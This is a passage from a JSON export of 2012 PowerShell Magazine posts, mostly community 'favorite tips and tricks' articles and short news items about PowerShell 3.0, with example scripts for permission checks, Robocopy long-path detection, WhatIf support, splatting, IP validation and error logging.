% { \u0026quot;$([char]$_)\u0026quot; } ) | ? { $_.SideIndicator -eq '\u0026amp;lt;=' } | % { $_.InputObject }) # For completeness, sort the output alphabetically $AvailableDriveLetter = ($TempDriveLetters | Sort-Object) if ($ReturnFirstLetterOnly -eq $true) { $TempDriveLetters[0] } else { $TempDriveLetters }  For a list of the cmdlets contained in the Storage module, see the following topic [on TechNet][2]\n[1]: /2012/01/12/find-an-unused-drive-letter/) [2]: http://technet.microsoft.com/en-us/library/hh848705.aspx\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/15/pstip-get-next-available-drive-letter/","tags":["Tips and Tricks"],"title":"#PSTip Get next available drive letter"},{"categories":["News"],"contents":"We are very excited about the RTM of Windows 8 and Windows Server 2012. You know the reason, right? The final version of Windows PowerShell 3.0. But that’s not the end of great news. We’ve just heard about Microsoft’s new portal for scripters—Microsoft All-In-One Script Framework. Microsoft All-In-One Script Framework is a centralized automation script sample library driven by IT professionals’ real-world tasks. The goal is to provide scenario-focused script samples for all Microsoft products, and save IT professionals’ time and effort in solving typical IT tasks. Microsoft observes IT professionals’ scenarios in the TechNet forums, support incidents, social media, and various IT communities. They write script samples based on IT professionals’ frequently asked tasks, and allow IT professionals to download them with a short script publishing cycle. Additionally, they will offer a free script request service. This service is a proactive way for IT community to obtain scripts for certain IT tasks directly from Microsoft.\nYou can stay up to date on the latest news, service offering, and script samples via Facebook and Twitter. You can also post your needs and questions to the product team of All-In-One Script Framework (AIOSF) and interact with other followers.\nHere’s a list of their scripts. Expect to see a lot more in the near future.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/02/announcing-microsoft-all-in-one-script-framework/","tags":["News"],"title":"Announcing Microsoft All-In-One Script Framework"},{"categories":["News"],"contents":"RunAs Radio is a weekly Internet audio talk show for IT Professionals working with Microsoft products. The full range of IT topics is covered from a Microsoft-centric viewpoint. In the latest show, Richard Campbell chats with Jeffrey Snover about DevOps at Microsoft. Jeffrey discusses his blog post Windows Server 2012, PowerShell 3.0 and DevOps.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/08/01/jeffrey-snover-on-runas-radio/","tags":["News"],"title":"Jeffrey Snover on RunAs Radio"},{"categories":["Tips and Tricks"],"contents":"When I met up with Aleksandar Nikolic at TechEd Europe I was asked if I wanted to write an article for PowerShell Magazine. I hope my tips are useful to you and feel free to leave a comment or question if you would like me to clarify anything.\nUsing –ErrorVariable to quickly check effective permissions for a user When working with permissions it is useful to know to which folders a user has access and to which folders access is denied. Although the Windows GUI does offer options for effective permissions, this is hardly appropriate when a large folder structure should be checked. This is where Get-ChildItem comes into play:\nGet-ChildItem –Force –Recurse –ErrorAction SilentlyContinue –ErrorVariable AccessDenied  This will display all files and folders that are accessible, and stores all inaccessible folders in the AccessDenied array. For the purpose of this example we will focus on the files and folders that generated an error. We do this by omitting the output of Get-ChildItem by writing the output to the special variable $null:\n$null = Get-ChildItem –Force –Recurse –ErrorAction SilentlyContinue –ErrorVariable AccessDenied  This gives us a list that contains all errors that have been generated by Get-ChildItem which conveniently gives us all the paths that were inaccessible.\n$AccessDenied | ForEach-Object {$_.Exception}  This command displays all the inaccessible paths including the error messages. To just display paths we can use the TargetObject property.\n$AccessDenied | ForEach-Object {$_.TargetObject}  This will display the names of the files and folders that were inaccessible. Because this catches all errors there might also be other reasons besides permissions which might be restricting access to a file or folder. Therefore it is important to verify the errors before assuming why access might have been denied to a folder.\nAs a bonus, since we should already be using PowerShell v3, we can shorten the last two commands:\n$AccessDenied.Exception $AccessDenied.TargetObject Parse Robocopy output in PowerShell to find long path names – Workaround for 260 character limit in Windows  The specified path, file name, or both are too long. The fully qualified file name must be less than 260 characters, and the directory name must be less than 248 characters.\n The dreaded error, I think everyone working with Windows has run into this at some point. Even in Windows 8/Server 2012 we are still limited by this. It might be a file server with an exotic folder structure or just a single file with a long name that we cannot get rid of. This tip will show how to use Robocopy to detect the files and folders that have a long path.\nLet’s start out with a simple example displaying the difference in speed of using Get-ChildItem in combination with Measure-Object, or by using Robocopy to count the number of files and the total size of a folder:\n(Measure-Command {1..10 | ForEach-Object {Get-ChildItem C:\\Windows -Recurse -Force -ErrorAction SilentlyContinue | Where-Object {!$_.PSIsContainer} | Measure-Object Length -Sum}}).TotalSeconds 283.4675185 (Measure-Command {1..10 | ForEach-Object {robocopy.exe c:\\windows c:\\doesnotexist /l /e /b /copy:d /np /fp /nfl /ndl /njh}}).TotalSeconds 51.6469264 Both these commands generate similar output, but by using Robocopy we manage to get the results several times faster.\nNow on to the more interesting stuff; using Robocopy to detect long file and folder paths. Since Robocopy uses a predictable output we can parse its output to extract the information we require. In this scenario we will use Robocopy to find files with a path longer than the maximum allowed. The next example will output a list of files that have a path longer than 260 characters:\nrobocopy.exe c:\\deeppathtest c:\\doesnotexist /l /e /b /np /fp /njh /njs /ndl | Where-Object {$_.Length -ge 286} | ForEach-Object {$_.Substring(26,$_.Length-26)}  To simplify this command I have written a short function to this process. It can be downloaded from the TechNet Script Repository: Get-LongPathName.ps1\nUsing this function, we can search for files and folders with long pathnames. The function outputs an object that contains the PathLength, Type (File or Folder) and the FullPath to the file or folder. Here is an example of how to utilize this function:\nGet-LongPathName -FolderPath ‘C:\\Deeppathtest’ -MaxDepth 200  This will output all files and folders with a path longer than 200 characters in the C:\\Deeppathtest folder. And because this function returns an object the output can be sorted and otherwise manipulated making the output easy to work with.\nFunction Get-LongPathName Function Get-LongPathNames { [CmdletBinding()] param( [Parameter(Position=0,Mandatory=$true,ValueFromPipeline=$true, ValueFromPipelineByPropertyName=$true)] [string[]]$FolderPath, [ValidateRange(10,248)][int16]$MaxDepth=248 ) begin { if (!(Test-Path -Path $(Join-Path $env:SystemRoot 'System32\\robocopy.exe'))) { write-warning \u0026quot;Robocopy not found, please install robocopy\u0026quot; return } $Results = @() } process { foreach ($Path in $FolderPath) { $RoboOutput = robocopy.exe $Path c:\\doesnotexist /l /e /b /np /fp /njh /njs # Build Array for files. 26 is added to $MaxDepth the text string generated by Robocopy $RoboOutput | Select-String \u0026quot;New File\u0026quot; | Where-Object {$_.Line.Length -ge $MaxDepth+26} | ForEach-Object { $Props = @{ FullPath= $_.Line.Substring(26,$_.Line.Length-26) Type = 'File' PathLength = $_.Line.Length-26 } $Results += New-Object -TypeName PSCustomObject -Property $Props } # Append folders to array # Build Array for files $RoboOutput | Select-String \u0026quot;New Dir\u0026quot; | Where-Object {$_.Line.Length -ge ($MaxDepth+22)} | ForEach-Object { $Props = @{ FullPath = $_.Line.Substring(22,$_.Line.Length-22) Type = 'Folder' PathLength = $_.Line.Length-22 } $Results += New-Object -TypeName PSCustomObject -Property $Props } } } end { $Results } }  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/07/24/jaap-brassers-favorite-powershell-tips-and-tricks/","tags":["Tips and Tricks"],"title":"Jaap Brasser’s Favorite PowerShell Tips and Tricks"},{"categories":["News"],"contents":"Working with PowerShell and Configuration Manager? Check out the Configuration Manager PowerShell SDK website, created by MVP Kaido Järvemet. It is targeted toward Configuration Manager administrators and developers who are looking for How-To examples. The site offers a library of PowerShell scripts with over 40 scripts (and counting…).\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/07/03/configuration-manager-powershell-sdk/","tags":["News"],"title":"Configuration Manager PowerShell SDK"},{"categories":["News"],"contents":"Some of you have noticed that the CTP Workflow PDF guide that was a part of PowerShell 3.0 CTP download is no longer available. The content of the guide is now incorporated into the Workflow documentation on TechNet. Keep an eye open on this space as more and more new stuff will be added there.\nHaven’t started with Workflows yet? Here are a few related posts on the PowerShell team blog:\n When Windows PowerShell Met Workflow High Level Architecture of Windows PowerShell Workflow (Part 1) High Level Architecture of Windows PowerShell Workflow (Part 2)  And a video with Bruce Payette, about PowerShell Workflows in PowerShell v3 (from the 2011 Deep Dive conference in Frankfurt, Germany)\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/28/workflow-documentation-now-live-on-technet/","tags":["News"],"title":"Workflow documentation now live on TechNet"},{"categories":["Tips and Tricks"],"contents":"Instead of an introduction about what I was asked to do and how I went about it, I decided to cut to the chase and give you a bonus tip on how to learn a PowerShell cmdlet a day. I saw this tip on twitter earlier this year and I honestly don’t remember who twitted it or I would give them credit: Want to learn PowerShell? Start every morning with “Get-Command | Get-Random | Get-Help -Full”.\nDon’t hard code any type of Format or Output cmdlet into your scripts Whether you’re writing a long complicated PowerShell script or a one liner that you’re saving as a script, design your code for reusability. One of the most common things I see is hardcoding Format-List, Format-Table, Out-File, and Export-CSV cmdlets into PowerShell scripts which limits how the output of the script can be changed on the fly without having to manually modify it each time. There’s almost no reason to hard code these cmdlets into a script since it can be piped to any of these which accomplishes the same task while maximizing the scripts versatility. The only exception would be if you are automating a task that’s calling a PowerShell script and it will only ever be used for this one thing. I’m going to use a very basic example because it’s not about how complicated the script is, but it’s about the concept of writing versatile scripts that are reusable.\nThis first script is named Get-CPUProcessTime1.ps1 and while it appears to produce the same output on the screen as the second script, the type of object it produces is different which limits its reusability.\nGet-Process | Format-Table @{label='CPU Time';Expression={$_.Cpu}}, @{Label='Process Name'; Expression ={$_.ProcessName}}  When trying to pipe this script to the Out-GridView cmdlet, an error is received because of the type of object that format cmdlets produce.\nYou also notice when trying to pipe it to the Sort-Object cmdlet, an error is produced:\nThe version of this script shown below is named Get-CPUProcessTime2.ps1 and it uses the Select-Object cmdlet for the hash table instead of using the Format-Table cmdlet as in the previous script. Whether you’re choosing specific parameters or using a hash table, I recommend using the Select-Object cmdlet for accomplishing these tasks instead of a Format cmdlet.\nGet-Process | Select-Object @{Label='CPU Time';Expression ={$_.Cpu}}, @{Label='Process Name';Expression ={$_.ProcessName}}  This version of the script can be piped to the Out-GridView cmdlet without error:\nIt can also be piped to the Sort-Object cmdlet without error:\nThe third example is the same as the second except the Out-File cmdlet is hardcoded in the script:\nGet-Process | Select-Object @{Label='CPU Time';Expression ={$_.Cpu}}, @{Label='Process Name';e={$_.ProcessName}} | Out-File d:\\tmp\\test.txt  Guess what happens when this version of the script is piped to the Out-GridView cmdlet?\nThe file is created as specified in the script and the pipe to the Out-GridView cmdlet is ignored. That’s because the Out-File cmdlet doesn’t produce an object so you’re piping nothing to the Out-GridView cmdlet. These same results are produced when using the Export-CSV cmdlet instead of Out-File.\nLet’s say I wanted to use the Format-Table cmdlet for the –AutoSize parameter to make the output look a little nicer on the screen, there’s still no reason to hard code that into the script since it can easily be piped to Format-Table without losing its versatility:\nPowerShell cmdlets are like Lego blocks, you can build anything you want and for the most part you’re only limited by your imagination, but hard coding Format, Out, and Export cmdlets in your scripts is like super gluing your Lego blocks together (they’re no longer reusable). This applies even if you’re only writing one liners that are being saved as scripts.\nYou have to learn how to use a hammer before you can build a house This means you need to learn the three fundamental PowerShell cmdlets that are the building blocks to all others. These are Get-Help, Get-Command, and Get-Member. These three cmdlets are the key to understanding PowerShell. The first tip leads into this one since I referenced objects in the first tip and piped one of my scripts to the Get-Member cmdlet to determine what type of object it produced.\nThe Get-CPUProcessTime.ps1 script that I created produces a bunch of Format objects, here’s the first one which is a FormatStartData object. These types of objects aren’t usable by most other cmdlets with the Out-File and other Out-* cmdlets being the only exceptions that I’m aware of.\nThe second script I created (Get-CPUPRocessTime2.ps1) produces a process object and is a normal object type that can be used by many other cmdlets such as Sort-Object which was shown in the first tip.\nThere’s lots of great information out there on these three cmdlets and each of them could each take the entirety of this article. For more information on Get-Help and Get-Command see my blog article on them.\nWrite efficient scripts whether they’re being run locally or if they’re using PowerShell remoting Filter Left and Filter Remote. While I think this tip is a no-brainer or a given, I still continue to see scripts posted on the Internet by other people who consider themselves to be PowerShell enthusiast that aren’t using these best practices. Here’s an example that came from a recent blog on the Internet. I’ve changed the module that’s being used so it can’t be tracked back to the person who wrote it:\nGet-Command|where{$_.modulename -eq \"activedirectory\"}|%{$_.name}  The syntax is hard to read since it contains almost no spacing. This was an exact copy of what I found on the blog article I referenced and not the way I would write this script. It returns a list of all the cmdlets in the ActiveDirectory PowerShell module. Wrapping it in the Measure-Command cmdlet shows that it takes 886 milliseconds to return the results:\nMeasure-Command { Get-Command|where{$_.modulename -eq \"activedirectory\"}|%{$_.name} }  Here’s how to filter left and efficiently accomplish the same task:\nGet-Command -Module ActiveDirectory | Select-Object -ExpandProperty Name  Wrapping this version in the Measure-Command cmdlet shows it completed in just 17 milliseconds:\nMeasure-Command { Get-Command -Module ActiveDirectory | Select-Object -ExpandProperty Name }  The first script takes 5112 percent more time to accomplish the same task since it doesn’t filter left and it is what I would call an inefficient script.\nIf you’re using PowerShell remoting, you want to filter as much as possible on the remote host (inside your script block) since that will take advantage of distributed computing and it will also generate less network traffic than bringing every result back to your computer only to filter them down to a subset at that point. As the Microsoft Scripting Guy, Ed Wilson said this year during his PowerShell session at SQL Saturday 111 in Atlanta, don’t buy the whole box of Whitman’s samplers if all you like is chocolate covered peanuts.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/27/mike-f-robbinss-favorite-powershell-tips-tricks/","tags":["Tips and Tricks"],"title":"Mike F Robbins’s Favorite PowerShell Tips \u0026 Tricks"},{"categories":["News"],"contents":"Microsoft has updated the Quick Reference Guides page with a new PDF guide: WMI and CIM quick reference. The two page guide describes differences between Windows Management Instrumentation (WMI) in Windows PowerShell 2.0 and 3.0. It includes examples of how to find namespaces and classes in WMI, detailed information about CimSession, CimInstance, CIM operations, and invoking a CIM method. The quick reference describes how to get a list of new CIM cmdlets, and defines associations, WQL, WS-Man, WinRM, and CIM indications.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/27/windows-powershell-3-0-and-server-manager-quick-reference-guides-updated/","tags":["News"],"title":"Windows PowerShell 3.0 and Server Manager Quick Reference Guides (updated)"},{"categories":["Tips and Tricks"],"contents":"I was asked to come up with a list of 3 PowerShell tips that I use. This was a tough task to come up with because there are just so many tips that I would like to share. So after a lot of thinking (and perhaps some use of Get-Random :)) I finally figured out what I would talk about. So with that and in no particular order, here are my 3 tips for PowerShell.\nSupportsShouldProcess to allow –WhatIf to your functions or script Whenever I am writing a script or function that will perform some sort of action that will make a change, whether it is to write, delete create, update, etc…, I always make a case to put in a little bit of extra precaution to allow the use of –WhatIf whenever someone attempts to run the code and isn’t quite sure of what might happen. What this means is that if I decide to run my code, I can see what it would do instead of just running it and assuming I know what it will do.\nTake this for example:\nGet-Process | Stop-Process –WhatIf  If the –WhatIf wasn’t specified in the Stop-Process, every process on the system would try to be stopped.\nSo how can you do this? First you start out by adding the following code to enable the use of –WhatIf.\n[CmdletBinding( SupportsShouldProcess=$True )]  This doesn’t automatically allow you to use –WhatIf even if it is specified, we still need to add some extra code to handle how the script/function will react if –WhatIf is used. We need to also use\n$PSCmdlet.ShouldProcess(Target, Action)  This is a simple function to highlight how you would accomplish this:\nFunction Invoke-EncryptFile { [CmdletBinding( SupportsShouldProcess=$True )] Param ( [parameter(ValueFromPipeLine=$True,ValueFromPipeLineByPropertyName=$True)] [string]$File ) Process { ForEach ($item in $file) { If ($PSCmdlet.ShouldProcess(\u0026quot;$Item\u0026quot;,\u0026quot;Encrypt File\u0026quot;)) { [IO.File]::Encrypt($Item) } } } } Invoke-EncryptFile –File 'services.csv' –WhatIf  As you can see, instead of actually performing the action, it tells you what it would do. Another bonus feature of this is that it also gives you a helpful message if you run the command with the –Verbose switch.\nInvoke-EncryptFile 'services.csv' -Verbose  How about that? It is like two deals for the price of one!\nSplatting Splatting is useful as it helps simplify your code to make it look cleaner. Take this simple code snippet for example:\nParam( $ComputerName = $env:COMPUTERNAME, $Credential ) Process { If ($Credential) { Try { Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Class Root\\CIMV2 ` -Filter \u0026quot;IPEnabled='True'\u0026quot; -ComputerName $ComputerName -Credential $Credential -ErrorAction Stop } Catch { Write-Warning (\u0026quot;{0}: {1}\u0026quot; -f $ComputerName,$_.Exception.Message) } } Else { Try { Get-WmiObject -Class Win32_NetworkAdapterConfiguration -Class Root\\CIMV2 ` -Filter \u0026quot;IPEnabled='True'\u0026quot; -ComputerName $ComputerName -ErrorAction Stop } Catch { Write-Warning (\u0026quot;{0}: {1}\u0026quot; -f $ComputerName,$_.Exception.Message) } } }  Ok, this works, but really isn’t the easiest on the eyes to read. We are also specifying the same command more than once with only a minor change in what parameters are being used. Now let’s take a look at it using splatting.\nParam( $ComputerName = $env:COMPUTERNAME, $Credential ) Begin { $WMIParam = @{ ComputerName = $ComputerName Class = 'Win32_NetworkAdapterConfiguration' Namespace = 'Root\\CIMV2' Filter = \u0026quot;IPEnabled='True'\u0026quot; ErrorAction = 'Stop' } If ($PSBoundParameters['Credential']) { $WMIParam.Credential = $Credential } } Process { Try { Get-WmiObject @WMIParam } Catch { Write-Warning (\u0026quot;{0}: {1}\u0026quot; -f $ComputerName,$_.Exception.Message) } } With just a little use of splatting, we now off-loaded most of our parameters to a hash table at the beginning of the code in the Begin{} block and only run the command one time in the Process{} block!\nValidate an IP address with [ipaddress] type accelerator Sometimes I see folks who write a UI or some other script that requests an IP address which is then validated using regular expressions to determine if it can actually be used or not. While I love to work with regular expressions, something like this is probably a little more complicated than it needs to be especially if you are looking to validate both an IPV4 and an IPV6 address.\nTo get around this we can use the [ipaddress] type accelerator that allows us to validate that the IP address is legitimate.\n[ipaddress]\"192.168.1.1\"  [ipaddress]\"1::1f\"  Notice that the AddressFamily property differs between an IPV4 and an IPV6 address. So, what happens if we supply an invalid address?\n[ipaddress]\"195.258.1.1\"  Perfect! The IP address is shown to be invalid.\nLucky for us, this is Try/Catch friendly so I was able to put together a simple function that will return a $True/$False Boolean value that can be handy to use with a number of situations.\nFunction Test-IsValidIP { [CmdletBinding()] Param ( [parameter(ValueFromPipeLine=$True,ValueFromPipeLineByPropertyName=$True)] [Alias(\u0026quot;IP\u0026quot;)] [string]$IPAddress ) Process { Try { [ipaddress]$IPAddress | Out-Null Write-Output $True } Catch { Write-Output $False } } } Test-IsValidIP \u0026quot;192.1.5.16\u0026quot; True  Works great on an IPV4 address and returns a Boolean value of $True.\nTest-IsValidIP \u0026quot;FE80:0000:0000:0000:0202:B3FF:FE1E:8329\u0026quot; True Also works great on an IPV6 address.\nTest-IsValidIP \u0026quot;185.459.2.5\u0026quot; False As expected, this failed the validation and returned a $False value.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/20/boe-prox-favorite-powershell-tips-tricks/","tags":["Tips and Tricks"],"title":"Boe Prox’ Favorite PowerShell Tips \u0026 Tricks"},{"categories":["Tips and Tricks"],"contents":"When using anything in life with so many features and items you find useful every day of your life how do you narrow it down to 3? Well, here is my attempt (by the way, I have hundreds more).\nIntegration This might not be a particular tip or trick and is rather high level but it’s my favorite thing about PowerShell, products which were not written to work together inherently can now use PowerShell as a kind of glue to combine information together. I’m not just talking about products from separate 3rd parties but also products within the same company.\nFor example, back in the day when I was a system administrator I was always trying to export data from various products and use it elsewhere—perhaps check data in another system before performing an action on an item, Active Directory would create a user, give him a mailbox and even create the home directory for him but what if I wanted to take it one step further, add him to our HR system, provision him a virtual desktop or maybe just let someone know he existed… This was always the hard bit.\nNow with PowerShell we can not only manage and use the Microsoft products but also expand it to other third parties who have PowerShell snap-ins and modules or even more, expand it to most things with an Application Programming Interface (API) or COM object.\nA great example of this was when in a single script I was able recently to deploy bare metal Cisco UCS blades, configure them from front to end, move over to the VMware PowerShell snap-in (PowerCLI) and install the ESXi hypervisor on these blades. After this I could again configure them, add storage with the multiple vendors who have a PowerShell snap-in/module and then introduce them straight into VMware’s cloud platform to allow tenants to use them. Now that’s Power!\nBare metal to the cloud in a single script which automated multiple companies’ technologies to perform a repeatable and consistent end task.\n1 or 1 Million Virtual Machines? It might seem like a simple thing but I love anything that makes my job easier and PowerShell’s range operator (..) certainly does this.\nRange operator allows you to define a range of items very easily. In the past if I wanted to do something a number of times I would have needed to use a loop, I had to remember exactly where the brackets went and how to lay it out, now with range operator this becomes so much easier…\nSo, as you can see from the above we can easily lay out a range of numbers at the shell, but when does this become useful?\nHow about x amount of new VMs for testing?\nAnd it doesn’t end there, we can also create a range of characters:\nAs you can see, range operator is certainly a time-saver. I couldn’t tell you how many VMs I have created with this method or how much time this one trick has saved me.\nSkynet is now live Sometimes I think PowerShell is often a little too amazing, it scares me how easy things are and how tasks which used to be impossible are now easily achievable, almost as if PowerShell was sent back through time and was about to become self aware!\nOne of the areas that suprises me is the ability to be able to remote control internet explorer and also web pages. This can be very useful when filling out forms or even just for monitoring web sites to make sure the site is up, or the HTML code is what you expect. It can also be great for grabbing information from web sites.\nI’m not going to re-invent the wheel here—one of the best examples of this I have seen can be found here. It shows how to easily enter text, select radio buttons and press form buttons to submit the data.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/15/alan-renoufs-favorite-powershell-tips-and-tricks/","tags":["Tips and Tricks"],"title":"Alan Renouf’s Favorite PowerShell Tips and Tricks"},{"categories":["News"],"contents":"For those of us who couldn’t make it to Tech Ed this year, you can watch the live stream of today’s sessions HERE (begins at 08:30). Some of the PowerShell related video recordings are already available on Channel 9:\n  Windows PowerShell Crash Course\nSpeakers: Don Jones, Jeffrey Snover\n  Advanced Automation Using Windows PowerShell 3.0\nSpeakers: Travis Jones, Hemant Mahawar\n  Inside Windows Server 2012 Multi-Server Management Capabilities\nSpeakers: Jeffrey Snover, Erin Chapple\n  The Dirty Dozen: Windows PowerShell Scripts for the Busy DBA\nSpeakers: Aaron Nelson\n  Best Practices for Designing and Consolidating Group Policy for Performance and Security\nSpeakers: Darren Mar-Elia\n  Hyper-V over SMB2: Remote File Storage Support in Windows Server 2012 Hyper-V\nSpeakers: Jose Barreto\n  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/14/powershell-videos-from-teched-north-america-2012/","tags":["News"],"title":"PowerShell Videos From TechEd North America 2012"},{"categories":["Tips and Tricks"],"contents":"Having been asked to share some PowerShell tips and tricks I first got excited at the possibility, then, felt a small spell of writer’s block. Wait, tips? I’m neither an admin nor a dev. Hmm, what’s worth sharing from my little corner of the world? A lot of common tasks are well-covered, so, I riffled through my bag of ideas and came up with a few focused squarely on data. Since I deal with data and logging a good bit, the following items have been really great to have in my private tool box. Hopefully they will help others out as well.\nNOTE: I wait until PowerShell is fully released to the next version before moving my servers to the new version, so, all tips listed below are for version 2.0.\nUse Pattern Matching with Get-ChildItem to Decrease Search Times Get-ChildItem supports the use of more complex pattern matching to allow for very precise searching. For a straightforward example, I’ll start off with a directory search.\nIf I want to find text files in a directory, C:\\test, beginning with a, e or 1 I can use this pattern to locate what I need:\nGet-ChildItem -Path \"C:\\test\\[ae1]*.txt\"  In my organization we have large numbers of folders with identical structure, file naming conventions, and, predictable characteristics. So, I can extend this basic trick into much more complex searching techniques without using any sort of pipeline to filter output. In practical terms, a search such as this:\nGet-ChildItem -Path D:\\data -Recurse | Where-Object { $_.Name -match '[ae1]\\w+' }  When this search executes it walks the directory tree and can be extremely slow when there are large file/folder collections to examine. Essentially this is single threading the searching and leaving the algorithm to control how quickly you get what you need.\nThere’s no need for that. In my case, I spell out a tree with wildcards to restrict searching to an exact depth, use patterns to eliminate unnecessary matches like this:\nGet-ChildItem -Path \"D:\\data\\*\\*\\200[5-8]*\\[ae1]*.txt\"  This search looks at all folders 4 levels deep matching 2005, 2006, 2007 or 2008 and lists .txt files whose names begin with a, e or 1. Now that’s precision searching. In my universe I have seen well-crafted searches cut time from run to results from days to minutes.\nWhere this is really cool is that the same trick works for other PSProviders as well. Here is a snapshot of the Registry using the same approach:\nGet-ChildItem -Path 'HKLM:\\SOFTWARE\\Microsoft\\Microsoft SQL*\\*sql*'  See what other providers take advantage of this capability and speed up searching with greater result accuracy.\nCapture the Exact Location of Errors in Scripts A few of my projects require very verbose logging. If an error occurs I want to be able to know exactly where things went bad instead of having to reverse engineer the train wreck. The two main tools PowerShell offers to assist in this process are the try/catch/finally block and the InvocationInfo object. In my scripts I use the following pattern, with transcripts, to take advantage of the $Error object.\n# Simple function to capture time stamps function Get-TimeStamp { Get-DateTime -Format 'yyyy-MM-dd HH:mm:ss' } # Record output Start-Transcript \u0026quot;C:\\logs\\$(Write-TimeStamp).txt\u0026quot; # Configure script Set-StrictMode -Version 2.0 # Set preferences $ErrorActionPreference = 'Stop' # Clear error variable $Error.Clear() # try/catch/finally pattern try { Do-Work } catch { Write \u0026quot;$(Get-TimeStamp):\u0026quot; Write \u0026quot;$(Get-TimeStamp): --------------------------------------------------\u0026quot; Write \u0026quot;$(Get-TimeStamp): -- SCRIPT PROCESSING CANCELLED\u0026quot; Write \u0026quot;$(Get-TimeStamp): --------------------------------------------------\u0026quot; Write \u0026quot;$(Get-TimeStamp):\u0026quot; Write \u0026quot;$(Get-TimeStamp): Error in $($_.InvocationInfo.ScriptName).\u0026quot; Write \u0026quot;$(Get-TimeStamp):\u0026quot; Write \u0026quot;$(Get-TimeStamp): --------------------------------------------------\u0026quot; Write \u0026quot;$(Get-TimeStamp): -- Error information\u0026quot; Write \u0026quot;$(Get-TimeStamp): --------------------------------------------------\u0026quot; Write \u0026quot;$(Get-TimeStamp):\u0026quot; Write \u0026quot;$(Get-TimeStamp): Line Number: $($_.InvocationInfo.ScriptLineNumber)\u0026quot; Write \u0026quot;$(Get-TimeStamp): Offset: $($_.InvocationInfo.OffsetInLine)\u0026quot; Write \u0026quot;$(Get-TimeStamp): Command: $($_.InvocationInfo.MyCommand)\u0026quot; Write \u0026quot;$(Get-TimeStamp): Line: $($_.InvocationInfo.Line)\u0026quot; Write \u0026quot;$(Get-TimeStamp): Error Details: $($_)\u0026quot; Write \u0026quot;$(Get-TimeStamp):\u0026quot; Write \u0026quot;$(Get-TimeStamp): --------------------------------------------------\u0026quot; Write \u0026quot;$(Get-TimeStamp): -- Error information\u0026quot; Write \u0026quot;$(Get-TimeStamp): --------------------------------------------------\u0026quot; Write \u0026quot;$(Get-TimeStamp):\u0026quot; } finally { Stop-Transcript } If I run my script and hit a snag, this approach will generate something along these lines:\n2012-05-25 09:51:24: -------------------------------------------------- 2012-05-25 09:51:24: -- SCRIPT PROCESSING CANCELLED 2012-05-25 09:51:24: -------------------------------------------------- 2012-05-25 09:51:24: 2012-05-25 09:51:24: Error in C:\\scripts\\ConfigureServer.ps1. 2012-05-25 09:51:24: 2012-05-25 09:51:24: -------------------------------------------------- 2012-05-25 09:51:24: -- Error information 2012-05-25 09:51:24: -------------------------------------------------- 2012-05-25 09:51:24: 2012-05-25 09:51:24: Line Number: 1858 2012-05-25 09:51:24: Offset: 15 2012-05-25 09:51:24: Command: New-Item 2012-05-25 09:51:24: Line: New-Item -ItemType Directory -path $log | Out-Null 2012-05-25 09:51:24: Error Details: Cannot find drive. A drive with the name '(X)' does not exist. 2012-05-25 09:51:24: 2012-05-25 09:51:24: -------------------------------------------------- 2012-05-25 09:51:24: -- Error information 2012-05-25 09:51:24: -------------------------------------------------- 2012-05-25 09:51:24: ********************** Windows PowerShell Transcript End End time: 20120525095124 **********************  The catch block is passed the $Error object and processes it as the current object in the pipeline. By calling down into the InvocationInfo object my transcript tells me exactly where I need to look for the issue: line 1858 at column 15. The main gotcha with this trick is that the transcript feature is relegated to the console host off the shelf.\nIf I want to explicitly cancel processing in the try block I found that using throw, not Write-Error, was the key. When I used Write-Error it escaped the try scope and the InvocationInfo object referenced line 1 of its own scope. Here is how I handle explicit, non-terminating errors:\ntry { if(-not(Get-WmiObject -Class Win32_LogicalDisk -Filter \"DeviceID='X:'\")) { throw \"$(Get-TimeStamp): No X drive exists.\" } else { Do-Work } }  Custom Sorting with Sort-Object A while back I needed to sort on a set of folders using a System.Version object. I wrote quite a few functions trying to do some in-flight conversions. Eventually, I stumbled upon the fact the –Property parameter allows use of expressions. In my case, I populated an expression that converted the folder name into a System.Version object for sorting. No custom function was needed.\nGet-ChildItem C:\\test | Where-Object {$_.Name -as [Version]} | Sort-Object -Property @{expression={[Version] $_.name};Ascending=$true} | Select-Object -Last 2  This command searches my C:\\test folder and parses the following folders\nC:\\test\\1.1.5.4 C:\\test\\1.1.5.5 C:\\test\\1.2.3.1 C:\\test\\1.2.3.2 C:\\test\\1.3.1.1  And returns the last two, or, from the perspective of a System.Version object, the two highest versioned folders:\nC:\\test\\1.2.3.2 C:\\test\\1.3.1.1  Here is another example using System.Guid objects with the same folder. I create 5 folders whose names are Guids with this command:\n1..5 | Foreach-Object { md \"C:\\test\\$([Guid]::NewGuid().Guid)\" }  And, I then search using the Guid datatype within my expression to sort against:\nGet-ChildItem C:\\test | Where-Object {$_.Name -as [Guid]} | Sort-Object -Property @{e={[Guid] $_.name};Ascending=$true} | Select-Object -Last 2  Which returns the last two directories as Guids.\nMode LastWriteTime Length Name ---- ------------- ------ ---- d---- 6/4/2012 4:00 PM \u0026lt;DIR\u0026gt; c528caa9-2439-4c92-8150-b95028b03d7c d---- 6/4/2012 4:00 PM \u0026lt;DIR\u0026gt; ea568689-124d-4814-8d06-128caa7797dc  As noted in the Get-Help documentation, you can use anything for the custom sort object so long as you can get the expression to work. Other uses of this –Property/expression approach could be sorts against IP addresses, numerically ordered files, DateTime objects, TimeSpan… Once you convert the object into the type you need let .NET take care of the sorting and move onto the next task.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2012/06/13/will-steeles-favorite-powershell-tips-and-tricks/","tags":["Tips and Tricks"],"title":"Will 